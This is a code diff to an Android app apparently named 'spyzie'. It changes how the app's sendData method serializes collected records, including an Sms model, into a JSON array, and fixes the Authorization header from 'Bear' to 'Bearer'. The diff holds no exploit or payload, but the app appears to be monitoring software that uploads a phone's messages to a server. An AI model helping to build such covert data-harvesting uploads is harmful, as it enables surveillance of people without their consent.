@@ -18,6 +18,8 @@ import com.tantd.spyzie.data.model.Sms;
 import com.tantd.spyzie.util.Constants;
 import com.tantd.spyzie.util.JsonUtil;
 
+import org.json.JSONArray;
+
 import java.util.List;
 
 import io.reactivex.Single;
@@ -121,9 +123,9 @@ public class AppApiManager implements ApiManager {
     }
 
     private Single<CommonResponse> sendData(List<?> objects, DataType type) {
-        String json = JsonUtil.getInstance().toJson(objects);
+        JSONArray jsonArray = JsonUtil.getInstance().toJsonArray(objects);
         if (Constants.IS_DEBUG_MODE) {
-            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendData, json=" + json);
+            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendData, jsonArray=" + jsonArray);
         }
         if (Constants.IS_API_ACIVE) {
             String url = null;
@@ -144,11 +146,11 @@ public class AppApiManager implements ApiManager {
                     url = ApiEndPoint.ERROR_TRACKING;
                     break;
             }
-            return Rx2AndroidNetworking.post(url).addBodyParameter(objects)
+            return Rx2AndroidNetworking.post(url).addJSONArrayBody(jsonArray)
                     .setPriority(Priority.MEDIUM)
                     .addHeaders("Accept", "application/json")
                     .addHeaders("Content-Type", "application/json")
-                    .addHeaders("Authorization", "Bear " + getAccessToken())
+                    .addHeaders("Authorization", "Bearer " + getAccessToken())
                     .build().getObjectSingle(CommonResponse.class);
         } else {
             return null;
